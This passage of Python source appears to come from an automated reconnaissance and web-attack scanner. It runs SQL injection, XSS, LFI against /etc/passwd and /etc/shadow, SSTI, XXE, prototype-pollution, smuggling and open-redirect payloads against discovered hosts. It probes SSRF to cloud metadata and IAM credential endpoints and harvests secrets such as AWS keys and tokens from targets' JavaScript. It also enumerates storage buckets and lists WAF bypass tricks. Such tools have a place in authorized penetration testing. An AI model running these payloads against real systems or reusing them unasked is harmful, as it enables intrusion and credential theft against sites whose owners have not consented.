            svc = p.get("service","").lower()
            ver = p.get("version","").lower()
            for keyword,(cve_id,desc,sev) in KNOWN_RCE.items():
                if keyword in svc or keyword in ver:
                    log("rce",f"{R}{BD}{cve_id}{RS}  {desc}  on {ip}:{p['port_proto']}")
                    add_finding("rce_fingerprint",sev,host=ip,detail=desc,cve_id=cve_id)
    log("info","NVD CVE API lookup...")
    checked = set()
    for ip,data in list(port_results.items())[:5]:
        for p in data.get("ports",[])[:8]:
            svc = p.get("service","")
            ver_n = re.search(r'(\d+\.\d+[\.\d]*)',p.get("version",""))
            if not ver_n or not REQ_OK: continue
            key = f"{svc}-{ver_n.group(1)}"
            if key in checked: continue
            checked.add(key)
            try:
                r = safe_get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={svc}+{ver_n.group(1)}&resultsPerPage=3",timeout=12)
                jitter(1.0,0.5)
                if r and r.status_code == 200:
                    for v in r.json().get("vulnerabilities",[]):
                        cve = v.get("cve",{})
                        cid = cve.get("id","")
                        desc = next((d["value"] for d in cve.get("descriptions",[]) if d["lang"]=="en"),"")[:200]
                        score,sev2 = None,"unknown"
                        for mk in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
                            m2 = cve.get("metrics",{}).get(mk,[])
                            if m2:
                                score = m2[0].get("cvssData",{}).get("baseScore")
                                sev2  = m2[0].get("cvssData",{}).get("baseSeverity","unknown").lower()
                                break
                        if score and float(score) >= 7.0:
                            log("vuln",f"{R}{cid}{RS} score={score} ({sev2}) — {svc} {ver_n.group(1)}")
                            add_finding("nvd_cve",sev2,host=ip,detail=desc,cve_id=cid,score=score)
                            if check_cisa_kev(cid):
                                log("kev",f"{R}{BD}{cid} IS IN CISA KEV — ACTIVELY EXPLOITED IN THE WILD!{RS}")
                                add_finding("cisa_kev","critical",host=ip,detail=f"{cid} in CISA KEV list",cve_id=cid)
            except: pass

# ═══════════════════════════════════════════════════════════════════
# MODULE 9 — ACTIVE VULNERABILITY TESTING (Tier 1)
# ═══════════════════════════════════════════════════════════════════

# ─── SQLi ──────────────────────────────────────────────────────────
SQLI_PAYLOADS = ["'","\"","' OR '1'='1","' OR 1=1--","\" OR 1=1--",
    "1' ORDER BY 1--","1' ORDER BY 2--","1' ORDER BY 3--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(3)--","' AND SLEEP(3)--"]
SQLI_ERRORS = ["sql syntax","mysql_fetch","ora-","pg_query","sqlite_query",
    "unclosed quotation","odbc_exec","syntax error","mssql_query",
    "warning: mysql","you have an error in your sql syntax","division by zero",
    "supplied argument is not a valid mysql","microsoft ole db"]

def test_sqli(targets):
    section("PHASE 9a — SQL Injection Testing")
    log("info",f"Testing {min(len(targets),50)} endpoints for SQLi...")
    def test_one(target):
        for payload in SQLI_PAYLOADS[:8]:
            url = target["url"].replace("TEST",quote(payload))
            try:
                r = requests.get(url,timeout=6,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
                for err in SQLI_ERRORS:
                    if err in r.text.lower():
                        log("sqli",f"SQLi ERROR-BASED: {url}")
                        add_finding("sqli","critical",host=target["host"],
                                    detail=f"Param:{target['param']} Payload:{payload} Error:{err}",url=url)
                        return
            except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        list(ex.map(test_one,targets[:50]))

# ─── XSS ───────────────────────────────────────────────────────────
XSS_PAYLOADS = ["<script>alert(1)</script>","<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>","<svg onload=alert(1)>",
    "<body onload=alert(1)>","javascript:alert(1)",
    "\"><img src=x onerror=confirm(1)>","';alert(1)//"]

def test_xss(targets):
    section("PHASE 9b — Cross-Site Scripting (XSS) Testing")
    log("info",f"Testing {min(len(targets),40)} endpoints for XSS...")
    def test_one(target):
        for payload in XSS_PAYLOADS[:6]:
            url = target["url"].replace("TEST",quote(payload))
            try:
                r = requests.get(url,timeout=6,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
                if payload.lower() in r.text.lower():
                    log("xss",f"Reflected XSS: {url}")
                    add_finding("xss_reflected","high",host=target["host"],
                                detail=f"Param:{target['param']} Payload:{payload}",url=url)
                    return
            except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        list(ex.map(test_one,targets[:40]))

# ─── LFI ───────────────────────────────────────────────────────────
LFI_PAYLOADS = ["../../../etc/passwd","../../etc/passwd",
    "....//....//....//etc/passwd","%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd","../../../../etc/shadow",
    "../../../../windows/win.ini","../../../../boot.ini",
    "php://filter/read=convert.base64-encode/resource=index.php","/etc/passwd"]

def test_lfi(targets):
    section("PHASE 9c — LFI Testing")
    log("info",f"Testing {min(len(targets),30)} endpoints for LFI...")
    def test_one(target):
        for payload in LFI_PAYLOADS:
            url = target["url"].replace("TEST",quote(payload))
            try:
                r = requests.get(url,timeout=6,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
                for ind in ["root:x:","root:!:","[extensions]","for 16-bit","boot loader"]:
                    if ind.lower() in r.text.lower():
                        log("lfi",f"LFI CONFIRMED: {url}")
                        add_finding("lfi","critical",host=target["host"],
                                    detail=f"Param:{target['param']} Payload:{payload}",url=url)
                        return
            except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(test_one,targets[:30]))

# ─── CORS ──────────────────────────────────────────────────────────
def test_cors(http_results):
    section("PHASE 9d — CORS Misconfiguration Testing")
    for host,result in list(http_results.items())[:20]:
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        url = f"{scheme}://{host}/"
        for origin in ["https://evil.com","null","https://attacker.com"]:
            try:
                r = requests.get(url,timeout=6,verify=False,headers={"User-Agent":ua(),"Origin":origin})
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")
                if acao == "*" or acao == origin:
                    sev = "critical" if acac.lower() == "true" else "high"
                    log("cors",f"CORS misconfiguration: {host} reflects {origin} (creds={acac})")
                    add_finding("cors",sev,host=host,detail=f"Origin:{origin} ACAO:{acao} Creds:{acac}")
            except: pass

# ─── SSRF ──────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/maintenance",
    "http://127.0.0.1/","http://localhost/","http://[::1]/",
    "http://0.0.0.0/","http://2130706433/","http://127.1/",
    "dict://127.0.0.1:6379/info","file:///etc/passwd",
]
SSRF_PARAMS = ["url","redirect","next","return","host","ip","path","file",
               "load","fetch","callback","link","uri","href","dest","source",
               "to","from","target","resource","location","endpoint","proxy","site"]

def test_ssrf(http_results, subdomains):
    section("PHASE 9e — SSRF Detection")
    targets = []
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for param in SSRF_PARAMS:
            targets.append({"url":f"{base}/?{param}=TEST","host":host,"param":param})
        for param in result.get("input_params",[]):
            if param.lower() in SSRF_PARAMS:
                targets.append({"url":f"{base}/?{param}=TEST","host":host,"param":param})
    log("info",f"Testing {min(len(targets),60)} endpoints for SSRF...")
    def test_one(target):
        for payload in SSRF_PAYLOADS[:8]:
            url = target["url"].replace("TEST",quote(payload,safe=":/"))
            try:
                r = requests.get(url,timeout=7,verify=False,headers={"User-Agent":ua()},allow_redirects=True)
                for ind in ["ami-id","instance-id","security-credentials","iam",
                            "metadata","computeMetadata","kube-env","serviceAccountToken"]:
                    if ind.lower() in r.text.lower() and r.status_code == 200:
                        log("ssrf",f"SSRF CONFIRMED: {url}")
                        add_finding("ssrf","critical",host=target["host"],
                                    detail=f"Param:{target['param']} Payload:{payload} Indicator:{ind}",url=url)
                        return
                if r.status_code == 200 and any(x in r.text.lower() for x in ["root:x:","localhost","127.0.0.1"]):
                    log("ssrf",f"Possible SSRF: {url}")
                    add_finding("ssrf_possible","high",host=target["host"],
                                detail=f"Param:{target['param']} Payload:{payload}",url=url)
                    return
            except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        list(ex.map(test_one,targets[:60]))

# ─── SSTI ──────────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    ("{{7*7}}","49","Jinja2/Twig"),
    ("${7*7}","49","Freemarker/EL"),
    ("<%= 7*7 %>","49","ERB/EJS"),
    ("{{7*'7'}}","7777777","Jinja2"),
    ("#{7*7}","49","Ruby/Pebble"),
    ("*{7*7}","49","Spring SpEL"),
]

def test_ssti(targets):
    section("PHASE 9f — SSTI Testing → RCE")
    log("info",f"Testing {min(len(targets),40)} endpoints for SSTI...")
    def test_one(target):
        for payload,expected,engine in SSTI_PAYLOADS:
            url = target["url"].replace("TEST",quote(payload))
            try:
                r = requests.get(url,timeout=6,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
                if expected in r.text:
                    log("ssti",f"SSTI CONFIRMED ({engine}) → LIKELY RCE: {url}")
                    add_finding("ssti_rce","critical",host=target["host"],
                                detail=f"Engine:{engine} Param:{target['param']}",url=url)
                    return
            except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        list(ex.map(test_one,targets[:40]))

# ─── XXE ───────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]

def test_xxe(http_results):
    section("PHASE 9g — XXE Injection Testing")
    hosts = [h for h,v in http_results.items() if isinstance(v,dict) and "raw_httpx" not in v and v.get("forms",0) > 0][:15]
    log("info",f"Testing {len(hosts)} hosts with forms for XXE...")
    def test_one(host):
        result = http_results[host]
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for path in ["/api","/api/v1","/upload","/import","/xml","/soap",base]:
            for payload in XXE_PAYLOADS[:2]:
                try:
                    r = requests.post(f"{base}{path}" if path != base else base,
                                      data=payload,timeout=6,verify=False,
                                      headers={"User-Agent":ua(),"Content-Type":"application/xml"})
                    for ind in ["root:x:","root:!:","hostname","ami-id"]:
                        if ind in r.text:
                            log("xxe",f"XXE CONFIRMED: {base}{path}")
                            add_finding("xxe","critical",host=host,detail=f"XXE at {path} indicator:{ind}")
                            return
                except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        list(ex.map(test_one,hosts))

# ─── Prototype Pollution ────────────────────────────────────────────
PROTO_PAYLOADS = [
    {"__proto__":{"admin":True}},
    {"constructor":{"prototype":{"admin":True}}},
    {"__proto__":{"debug":True,"isAdmin":True}},
]

def test_prototype_pollution(http_results):
    section("PHASE 9h — Prototype Pollution Testing")
    hosts = [h for h,v in http_results.items()
             if isinstance(v,dict) and "raw_httpx" not in v
             and any(t in v.get("tech_stack",[]) for t in ["Express","Node.js","React","Angular","Vue"])][:10]
    log("info",f"Testing {len(hosts)} JS/Node.js hosts for prototype pollution...")
    for host in hosts:
        result = http_results[host]
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for path in ["/api","/api/v1","/login","/register","/user","/"]:
            for payload in PROTO_PAYLOADS:
                try:
                    r = requests.post(f"{base}{path}",json=payload,timeout=6,verify=False,
                                      headers={"User-Agent":ua(),"Content-Type":"application/json"})
                    if r.status_code not in (404,405) and any(x in r.text.lower() for x in ["admin","isadmin","privilege","role"]):
                        log("proto",f"Possible prototype pollution: {base}{path}")
                        add_finding("prototype_pollution","high",host=host,detail=f"Proto pollution at {path}")
                except: pass

# ─── HTTP Request Smuggling ─────────────────────────────────────────
def test_http_smuggling(http_results):
    section("PHASE 9i — HTTP Request Smuggling Detection")
    hosts = [h for h,v in http_results.items() if isinstance(v,dict) and "raw_httpx" not in v][:10]
    log("info",f"Testing {len(hosts)} hosts for CL.TE smuggling...")
    for host in hosts:
        try:
            payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\n"
                       f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX")
            s = socket.create_connection((host,443),timeout=5)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(s,server_hostname=host)
            ss.send(payload.encode()); resp = ss.recv(4096).decode(errors="replace"); ss.close()
            if resp and len(resp) > 0:
                log("smuggle",f"HTTP Smuggling probe sent to {host} — manual verification needed")
                add_finding("http_smuggling_probe","medium",host=host,detail="CL.TE probe — verify manually")
        except: pass

# ─── Open Redirect ──────────────────────────────────────────────────
REDIRECT_PARAMS = ["redirect","next","url","return","to","dest","destination","continue","forward","redir","r","u","link","goto"]

def test_open_redirect(targets):
    section("PHASE 9j — Open Redirect Testing")
    log("info",f"Testing {min(len(targets),30)} endpoints for open redirect...")
    for target in targets[:30]:
        if target["param"].lower() in REDIRECT_PARAMS:
            for payload in ["https://evil.com","//evil.com","/\\evil.com"]:
                url = target["url"].replace("TEST",quote(payload,safe=":/"))
                try:
                    r = requests.get(url,timeout=5,verify=False,headers={"User-Agent":ua()},allow_redirects=False)
                    loc = r.headers.get("Location","")
                    if "evil.com" in loc or loc.startswith("//"):
                        log("warn",f"Open Redirect: {url} → {loc}")
                        add_finding("open_redirect","medium",host=target["host"],detail=f"Param:{target['param']} → {loc}")
                except: pass

# ═══════════════════════════════════════════════════════════════════
# MODULE 10 — SMART RECON (Tier 2)
# ═══════════════════════════════════════════════════════════════════

# ─── JS Deep Analysis ───────────────────────────────────────────────
SECRET_RE = {
    "AWS Access Key":    r"AKIA[0-9A-Z]{16}",
    "Google API Key":    r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Token":      r"gh[pso]_[A-Za-z0-9]{36,}",
    "GitLab Token":      r"glpat-[A-Za-z0-9\-_]{20}",
    "Slack Token":       r"xox[baprs]-[0-9A-Za-z\-]{10,}",
    "Slack Webhook":     r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+",
    "Private Key":       r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----",
    "JWT":               r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9._-]{20,}",
    "Stripe Key":        r"sk_(test|live)_[0-9a-zA-Z]{24,}",
    "SendGrid":          r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}",
    "Twilio":            r"SK[0-9a-fA-F]{32}",
    "NPM Token":         r"npm_[A-Za-z0-9]{36}",
    "DB Connection":     r"(mysql|postgres|mongodb|redis)://[^\s\"'<>]{10,}",
    "Password in URL":   r"[?&]pass(word)?=[^&\s]{4,}",
    ".env Password":     r"(?i)(PASSWORD|PASSWD|DB_PASS|SECRET_KEY|API_KEY)\s*=\s*[^\s#]{4,}",
    "Bearer Token":      r"Authorization:\s*Bearer\s+[A-Za-z0-9\-._~+/]+=*",
    "Internal IP":       r"(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+",
}

def js_deep_analysis(http_results):
    section("PHASE 10a — JavaScript Deep Analysis")
    all_endpoints = set()
    hosts = [h for h,v in http_results.items() if isinstance(v,dict) and "raw_httpx" not in v][:20]
    log("info",f"Deep JS analysis on {len(hosts)} hosts...")
    def analyze(host):
        result = http_results[host]
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        eps = set()
        try:
            r = requests.get(base,timeout=8,verify=False,headers={"User-Agent":ua()})
            body = r.text
            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']',body,re.I)
            for js in js_urls[:15]:
                js_url = js if js.startswith("http") else urljoin(base,js)
                try:
                    jr = requests.get(js_url,timeout=8,verify=False,headers={"User-Agent":ua()})
                    jbody = jr.text
                    for ep in re.findall(r'["\']/(api|v\d+|rest|graphql|internal)[^\s"\']{0,100}["\']',jbody,re.I):
                        eps.add(urljoin(base,ep if isinstance(ep,str) else "/"+ep))
                    for s3 in re.findall(r'[a-z0-9\-]+\.s3[.\-][a-z0-9\-]*\.amazonaws\.com',jbody,re.I):
                        log("s3",f"S3 bucket in JS: {s3}"); add_finding("s3_in_js","medium",host=host,detail=f"S3: {s3}")
                    for internal in re.findall(r'["\']([a-z0-9\-]+\.internal[^\s"\']{0,50})["\']',jbody,re.I):
                        log("link",f"Internal hostname in JS: {internal}"); add_finding("internal_hostname","low",host=host,detail=internal)
                    for name,pattern in SECRET_RE.items():
                        if re.search(pattern,jbody,re.I):
                            log("secret",f"{R}{name}{RS} in {js_url}"); add_finding("secret_in_js","critical",host=host,detail=f"{name} in {js_url}")
                except: pass
            for name,pattern in SECRET_RE.items():
                if re.search(pattern,body,re.I):
                    log("secret",f"{R}{name}{RS} in {base}"); add_finding("secret_in_html","critical",host=host,detail=f"{name} in main page")
        except: pass
        return eps
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        for eps in ex.map(analyze,hosts): all_endpoints.update(eps)
    log("success",f"JS analysis: {BD}{len(all_endpoints)}{RS} hidden endpoints found")
    return list(all_endpoints)

# ─── GraphQL ────────────────────────────────────────────────────────
GRAPHQL_PATHS = ["/graphql","/graphiql","/__graphql","/api/graphql","/v1/graphql","/query","/gql","/graph"]

def test_graphql(http_results):
    section("PHASE 10b — GraphQL Analysis & Attacks")
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for path in GRAPHQL_PATHS:
            r = safe_get(f"{base}{path}")
            if r and r.status_code in (200,400):
                try:
                    ir = requests.post(f"{base}{path}",json={"query":"{__schema{types{name}}}"},
                                       timeout=8,verify=False,headers={"User-Agent":ua(),"Content-Type":"application/json"})
                    if ir.status_code == 200 and "__schema" in ir.text:
                        log("graphql",f"GraphQL introspection ENABLED: {base}{path}")
                        add_finding("graphql_introspection","high",host=host,detail=f"Introspection at {path}")
                        try:
                            types = [t.get("name","") for t in ir.json().get("data",{}).get("__schema",{}).get("types",[])]
                            sensitive = [t for t in types if any(x in t.lower() for x in ["user","admin","password","token","secret","auth","payment"])]
                            if sensitive:
                                log("graphql",f"Sensitive GraphQL types: {', '.join(sensitive[:5])}")
                                add_finding("graphql_sensitive_types","high",host=host,detail=f"Types: {', '.join(sensitive[:5])}")
                        except: pass
                    batch = [{"query":"{__typename}"}]*10
                    br = requests.post(f"{base}{path}",json=batch,timeout=8,verify=False,headers={"User-Agent":ua(),"Content-Type":"application/json"})
                    if br.status_code == 200 and isinstance(br.json(),list):
                        log("graphql",f"Batch queries enabled — DoS risk: {base}{path}")
                        add_finding("graphql_batch_dos","medium",host=host,detail=f"Batch at {path}")
                except: pass

# ─── S3 Enumeration ─────────────────────────────────────────────────
def s3_enum(domain):
    section("PHASE 10c — S3 & Cloud Storage Enumeration")
    company = domain.split(".")[0]
    perms = [company,f"{company}-backup",f"{company}-assets",f"{company}-prod",
             f"{company}-dev",f"{company}-staging",f"{company}-data",f"{company}-files",
             f"{company}-media",f"{company}-static",f"{company}-uploads",f"{company}-logs",
             f"www.{domain}",f"static.{domain}",f"media.{domain}",f"assets.{domain}",
             f"backup.{domain}",f"files.{domain}",f"data.{domain}"]
    log("info",f"Testing {len(perms)} S3 bucket permutations...")
    def check(bucket):
        for url in [f"https://{bucket}.s3.amazonaws.com/",f"https://s3.amazonaws.com/{bucket}/"]:
            r = safe_get(url,timeout=6)
            if r:
                if r.status_code == 200:
                    log("s3",f"S3 BUCKET PUBLIC READ: {url}")
                    add_finding("s3_public_read","critical",host=bucket,detail=f"Public S3: {url}")
                elif r.status_code == 403:
                    log("info",f"S3 exists (private): {bucket}")
        azure = f"https://{company}.blob.core.windows.net/{bucket}/"
        r = safe_get(azure,timeout=5)
        if r and r.status_code == 200:
            log("s3",f"Azure Blob PUBLIC: {azure}")
            add_finding("azure_blob_public","critical",host=bucket,detail=f"Public Azure: {azure}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        list(ex.map(check,perms))

# ─── ASN & IP Range ──────────────────────────────────────────────────
def asn_discovery(domain):
    section("PHASE 10d — ASN & IP Range Discovery")
    ip = resolve_ip(domain)
    if not ip: return {}
    result = {}
    r = safe_get(f"https://ipinfo.io/{ip}/json")
    if r and r.status_code == 200:
        data = r.json()
        asn = data.get("org","")
        result = {"asn":asn,"ip":ip,"city":data.get("city",""),"country":data.get("country",""),"hostname":data.get("hostname","")}
        log("success",f"IP: {ip} | ASN: {asn} | {data.get('city','')} {data.get('country','')}")
    r2 = safe_get(f"https://api.bgpview.io/ip/{ip}")
    if r2 and r2.status_code == 200:
        try:
            for p in r2.json().get("data",{}).get("prefixes",[])[:3]:
                prefix = p.get("prefix","")
                log("success",f"IP prefix: {prefix}")
                result.setdefault("prefixes",[]).append(prefix)
                add_finding("asn_range","info",host=domain,detail=f"IP range: {prefix}")
        except: pass
    return result

# ─── Certificate Analysis ────────────────────────────────────────────
def cert_analysis(domain, subdomains):
    section("PHASE 10e — TLS Certificate Analysis")
    results = {}
    for host in [domain]+list(subdomains.keys())[:10]:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host,443),timeout=5) as sock:
                with ctx.wrap_socket(sock,server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    sans = []
                    for field,values in cert.get("subjectAltName",[]):
                        if field == "DNS":
                            sans.append(values)
                            if values not in subdomains and values != domain:
                                log("link",f"New subdomain from cert SAN: {values}")
                                add_finding("cert_san_subdomain","info",host=host,detail=f"SAN: {values}")
                    exp = cert.get("notAfter","")
                    if exp:
                        exp_dt = datetime.datetime.strptime(exp,"%b %d %H:%M:%S %Y %Z")
                        days = (exp_dt-datetime.datetime.utcnow()).days
                        if days < 30:
                            log("warn",f"Cert expires in {days} days: {host}")
                            add_finding("cert_expiry","medium",host=host,detail=f"Expires in {days} days")
                    results[host] = {"sans":sans,"cipher":cipher,"expires":exp}
                    log("success",f"Cert {host}: SANs={len(sans)} Cipher={cipher[0] if cipher else '?'} Exp={exp[:11]}")
        except: pass
    return results

# ─── WAF Detection ──────────────────────────────────────────────────
WAF_SIGS = {
    "Cloudflare":["cf-ray","cloudflare","__cfduid","_cfuvid"],
    "AWS WAF":["x-amzn-requestid","awswaf","x-amz-cf-id"],
    "Akamai":["akamai","x-check-cacheable","x-akamai"],
    "F5 BIG-IP":["bigip","ts","tmui","f5"],
    "ModSecurity":["mod_security","modsecurity","NOYB"],
    "Imperva":["incap_ses","visid_incap","x-iinfo"],
    "Sucuri":["x-sucuri-id","sucuri"],
    "Nginx WAF":["nginx","naxsi"],
    "Wordfence":["wordfence"],
}
WAF_BYPASSES = {
    "Cloudflare":["Find origin IP via Shodan — bypass CDN directly",
                  "Header: X-Forwarded-For: 127.0.0.1",
                  "Use IPv6 address directly"],
    "ModSecurity":["HPP: param=val1&param=val2",
                   "Unicode: \\u003cscript\\u003e",
                   "Double URL encode: %253cscript%253e",
                   "Case variation: SeLeCt instead of SELECT"],
    "Generic":["X-Forwarded-For: 127.0.0.1","X-Real-IP: 127.0.0.1",
               "X-Originating-IP: 127.0.0.1","Content-Type: charset=ibm037"],
}

def detect_waf(http_results):
    section("PHASE 10f — WAF Detection & Bypass Techniques")
    waf_results = {}
    for host,result in list(http_results.items())[:15]:
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        detected = []
        rh = {k.lower():v.lower() for k,v in result.get("response_headers",{}).items()}
        combined = " ".join(rh.values())
        for waf,sigs in WAF_SIGS.items():
            for sig in sigs:
                if sig.lower() in combined:
                    if waf not in detected: detected.append(waf)
                    break
        try:
            probe = requests.get(f"{base}/?id=1'%20OR%20'1'='1",timeout=6,verify=False,headers={"User-Agent":ua()})
            prh = {k.lower():v.lower() for k,v in probe.headers.items()}
            for waf,sigs in WAF_SIGS.items():
                for sig in sigs:
                    if sig.lower() in " ".join(prh.values()):
                        if waf not in detected: detected.append(waf)
            if probe.status_code in (403,406,429,503):
                log("waf",f"WAF blocking probe on {host} (HTTP {probe.status_code})")
        except: pass
        if detected:
            log("waf",f"{host} — WAF: {', '.join(detected)}")
            add_finding("waf_detected","info",host=host,detail=f"WAF: {', '.join(detected)}")
            for waf in detected:
                for bypass in WAF_BYPASSES.get(waf,WAF_BYPASSES["Generic"])[:3]:
                    log("info",f"  Bypass → {bypass}")
        waf_results[host] = detected
    return waf_results

# ─── Favicon Hash ───────────────────────────────────────────────────
def favicon_hash(http_results):
    section("PHASE 10g — Favicon Hash Fingerprinting")
    for host,result in list(http_results.items())[:10]:
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for fpath in ["/favicon.ico","/favicon.png","/apple-touch-icon.png"]:
            r = safe_get(f"{base}{fpath}")
            if r and r.status_code == 200 and len(r.content) > 0:
                h = hashlib.md5(r.content).hexdigest()
                log("link",f"Favicon hash {host}: md5={h}")
                log("info",f"  Shodan pivot: http.favicon.hash:<murmur3>  (pip install mmh3 for real hash)")
                add_finding("favicon_fingerprint","info",host=host,detail=f"Favicon MD5: {h}")
                break

# ═══════════════════════════════════════════════════════════════════
# MODULE 11 — CLOUD & INFRASTRUCTURE (Tier 3)
# ═══════════════════════════════════════════════════════════════════

METADATA_ENDPOINTS = [
    ("AWS IMDSv1","http://169.254.169.254/latest/meta-data/"),
    ("AWS IAM Creds","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS UserData","http://169.254.169.254/latest/user-data/"),
    ("GCP metadata","http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
    ("Azure IMDS","http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("DigitalOcean","http://169.254.169.254/metadata/v1/"),
    ("Alibaba Cloud","http://100.100.100.200/latest/meta-data/"),
]

def test_cloud_metadata(http_results):
    section("PHASE 11a — Cloud Metadata Endpoint Testing")
    log("info","Direct cloud metadata probe...")
    for name,url in METADATA_ENDPOINTS:
        r = safe_get(url,timeout=3)
        if r and r.status_code == 200 and len(r.text) > 10:
            log("cloud",f"CLOUD METADATA ACCESSIBLE: {name} — {url}")
            add_finding("cloud_metadata_exposed","critical",host="cloud_metadata",
                        detail=f"{name} accessible: {r.text[:200]}")
    log("info","Testing SSRF → cloud metadata on discovered hosts...")
    for host,result in list(http_results.items())[:5]:
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        for param in ["url","host","path","redirect","fetch"]:
            for name,meta_url in METADATA_ENDPOINTS[:3]:
                test_url = f"{scheme}://{host}/?{param}={quote(meta_url,safe=':/.')}"
                r = safe_get(test_url,timeout=6)
                if r and r.status_code == 200:
                    for ind in ["ami-id","instance-id","iam","serviceAccountToken","computeMetadata"]:
                        if ind.lower() in r.text.lower():
                            log("ssrf",f"SSRF → {name} via {host}?{param}=...")
                            add_finding("ssrf_cloud_metadata","critical",host=host,
                                        detail=f"SSRF to {name} via param:{param}",url=test_url)

def ipv6_scan(dns_records, scan_type="quick"):
    section("PHASE 11b — IPv6 Scanning")
    ipv6_addrs = dns_records.get("AAAA",[])
    if not ipv6_addrs:
        log("info","No AAAA records — skipping IPv6"); return {}
    results = {}
    log("info",f"Scanning {len(ipv6_addrs)} IPv6 addresses...")
    for addr in ipv6_addrs[:5]:
        if not tool_ok("nmap"): break
        out,_,rc = run_cmd(f"nmap -6 -T4 -sV --open -p 80,443,22,8080,8443 {addr}",60)
        if rc == 0 and out:
            results[addr] = out
            for line in out.splitlines():
                if "/tcp" in line and "open" in line:
                    log("success",f"IPv6 open: {addr} — {line.strip()}")
                    add_finding("ipv6_open_port","info",host=addr,detail=line.strip())
    return results

def audit_headers(http_results):
    section("PHASE 11c — Security Header Full Audit")
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        missing = result.get("missing_security_headers",[])
        rh = result.get("response_headers",{})
        for h in missing:
            add_finding("missing_header","medium" if h in ("Content-Security-Policy","Strict-Transport-Security") else "low",
                        host=host,detail=f"Missing: {h}")
        for header,val in rh.items():
            if header.lower() == "server" and re.search(r'\d+\.\d+',val):
                log("warn",f"{host} version disclosure: {val}")
                add_finding("server_version_disclosure","low",host=host,detail=f"Server: {val}")
            if header.lower() == "x-powered-by":
                log("warn",f"{host} tech disclosure: {val}")
                add_finding("tech_disclosure","low",host=host,detail=f"X-Powered-By: {val}")
        sc = rh.get("Set-Cookie","")
        if sc:
            for flag,detail in [("secure","Cookie missing Secure flag"),
                                  ("httponly","Cookie missing HttpOnly flag"),
                                  ("samesite","Cookie missing SameSite attribute")]:
                if flag not in sc.lower():
                    add_finding(f"cookie_{flag}","medium" if flag != "samesite" else "low",host=host,detail=detail)
        if missing: log("warn",f"{host}: missing {', '.join(missing[:4])}")

# ═══════════════════════════════════════════════════════════════════
# MODULE 12 — LINKPIECE
# ═══════════════════════════════════════════════════════════════════
INTERESTING_PARAMS = ["id","user","username","email","password","token","key","secret",
    "file","path","url","redirect","next","return","page","cat","search","q","query",
    "cmd","exec","command","ping","host","ip","port","debug","admin","auth","role",
    "priv","access","type","action","method","lang","include","require","load",
    "template","view","module","plugin","callback","jsonp","format","output","api"]

def linkpiece(domain, http_results, wayback_urls):
